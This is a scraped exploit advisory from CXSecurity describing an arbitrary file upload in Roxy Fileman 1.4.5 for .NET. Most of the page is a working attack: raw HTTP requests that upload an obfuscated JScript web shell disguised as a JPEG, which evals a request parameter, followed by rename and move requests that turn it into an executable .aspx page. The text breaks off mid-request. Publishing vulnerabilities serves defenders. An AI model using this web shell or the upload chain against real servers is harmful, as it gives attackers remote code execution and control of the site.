---
title: Roxy Fileman 1.4.5 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023040040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:21.797425
---

# Roxy Fileman 1.4.5 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Roxy Fileman 1.4.5 Shell Upload** **2023.04.10**  Credit:  **[Zer0FauLT](https://cxsecurity.com/author/Zer0FauLT/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Roxy Fileman 1.4.5 For .NET Arbitrary File Upload
# Date: 09/04/2023
# Exploit Author: Zer0FauLT [admindeepsec@proton.me]
# Vendor Homepage: roxyfileman.com
# Software Link: https://web.archive.org/web/20190317053437/http://roxyfileman.com/download.php?f=1.4.5-net
# Version: <= 1.4.5
# Tested on: Windows 10 and Windows Server 2019
# CVE : 0DAY
##########################################################################################
# First, we upload the .jpg shell file to the server. #
##########################################################################################
POST /admin/fileman/asp\_net/main.ashx?a=UPLOAD HTTP/2
Host: pentest.com
Cookie: Customer=Id=bkLCsV0Qr6mLH0+CgfcP0w==&Data=/2EMzCCeHGKADtgbKxqVyPZUIM25GBCMMU+Dlc7p8eRUNvoRLZaKEsUclgMRooB3akJsVikb4hTNNkDeE1Dr4Q==; roxyview=list; roxyld=%2FUpload%2FPenTest
Content-Length: 666
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Accept: \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygOxjsc2hpmwmISeJ
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://pentest.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pentest.com/admin/fileman/index.aspx
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
------WebKitFormBoundarygOxjsc2hpmwmISeJ
Content-Disposition: form-data; name="action"
upload
------WebKitFormBoundarygOxjsc2hpmwmISeJ
Content-Disposition: form-data; name="method"
ajax
------WebKitFormBoundarygOxjsc2hpmwmISeJ
Content-Disposition: form-data; name="d"
/Upload/PenTest
------WebKitFormBoundarygOxjsc2hpmwmISeJ
Content-Disposition: form-data; name="files[]"; filename="test.jpg"
Content-Type: image/jpeg
â€°PNG
<%@PAGE LANGUAGE=JSCRIPT EnableTheming = "False" StylesheetTheme="" Theme="" %>
<%var PAY:String=
Request["\x61\x62\x63\x64"];eval
(PAY,"\x75\x6E\x73\x61"+
"\x66\x65");%>
------WebKitFormBoundarygOxjsc2hpmwmISeJ--
##########################################################################################
# In the second stage, we manipulate the .jpg file that we uploaded to the server. #
##########################################################################################
{
"FILES\_ROOT": "",
"RETURN\_URL\_PREFIX": "",
"SESSION\_PATH\_KEY": "",
"THUMBS\_VIEW\_WIDTH": "140",
"THUMBS\_VIEW\_HEIGHT": "120",
"PREVIEW\_THUMB\_WIDTH": "300",
"PREVIEW\_THUMB\_HEIGHT":"200",
"MAX\_IMAGE\_WIDTH": "1000",
"MAX\_IMAGE\_HEIGHT": "1000",
"INTEGRATION": "ckeditor",
"DIRLIST": "asp\_net/main.ashx?a=DIRLIST",
"CREATEDIR": "asp\_net/main.ashx?a=CREATEDIR",
"DELETEDIR": "asp\_net/main.ashx?a=DELETEDIR",
"MOVEDIR": "asp\_net/main.ashx?a=MOVEDIR",
"COPYDIR": "asp\_net/main.ashx?a=COPYDIR",
"RENAMEDIR": "asp\_net/main.ashx?a=RENAMEDIR",
"FILESLIST": "asp\_net/main.ashx?a=FILESLIST",
"UPLOAD": "asp\_net/main.ashx?a=UPLOAD",
"DOWNLOAD": "asp\_net/main.ashx?a=DOWNLOAD",
"DOWNLOADDIR": "asp\_net/main.ashx?a=DOWNLOADDIR",
"DELETEFILE": "asp\_net/main.ashx?a=DELETEFILE",
"MOVEFILE": "asp\_net/main.ashx?a=MOVEFILE",
"COPYFILE": "asp\_net/main.ashx?a=COPYFILE",
"RENAMEFILE": "asp\_net/main.ashx?a=RENAMEFILE",
"GENERATETHUMB": "asp\_net/main.ashx?a=GENERATETHUMB",
"DEFAULTVIEW": "list",
"FORBIDDEN\_UPLOADS": "zip js jsp jsb mhtml mht xhtml xht php phtml php3 php4 php5 phps shtml jhtml pl sh py cgi exe application gadget hta cpl msc jar vb jse ws wsf wsc wsh ps1 ps2 psc1 psc2 msh msh1 msh2 inf reg scf msp scr dll msi vbs bat com pif cmd vxd cpl htpasswd htaccess",
"ALLOWED\_UPLOADS": "bmp gif png jpg jpeg",
"FILEPERMISSIONS": "0644",
"DIRPERMISSIONS": "0755",
"LANG": "auto",
"DATEFORMAT": "dd/MM/yyyy HH:mm",
"OPEN\_LAST\_DIR": "yes"
}
############################################################################################################################################################################################################################
# We say change the file name and we change the relevant "asp\_net/main.ashx?a=RENAMEFILE" parameter with the "asp\_net/main.ashx?a=MOVEFILE" parameter and manipulate the paths to be moved on the server as follows. #
############################################################################################################################################################################################################################
POST /admin/fileman/asp\_net/main.ashx?a=RENAMEFILE&f=%2FUpload%2FPenTest%2Ftest.jpg&n=test.aspx HTTP/2
Host: pentest.com
Cookie: Customer=Id=bkLCsV0Qr6mLH0+CgfcP0w==&Data=/2EMzCCeHGKADtgbKxqVyPZUIM25GBCMMU+Dlc7p8eRUNvoRLZaKEsUclgMRooB3akJsVikb4hTNNkDeE1Dr4Q==; roxyview=list; roxyld=%2FUpload%2FPenTest
Content-Length: 44
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Accept: application/json, text/javascript, \*/\*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://pentest.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pentest.com/admin/fileman/index.aspx
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
f=%2FUpload%2FPenTest%2Ftest.jpg&n=test.aspx
===========================================================================================================================================================================================================================
POST /admin/fileman/asp\_net/main.ashx?a=MOVEFILE&f=%2FUpload%2FPenTest%2Ftest.jpg&n=%2FUpload%2FNewFolder%2Ftest.aspx HTTP/2
Host: pentest.com
Cookie...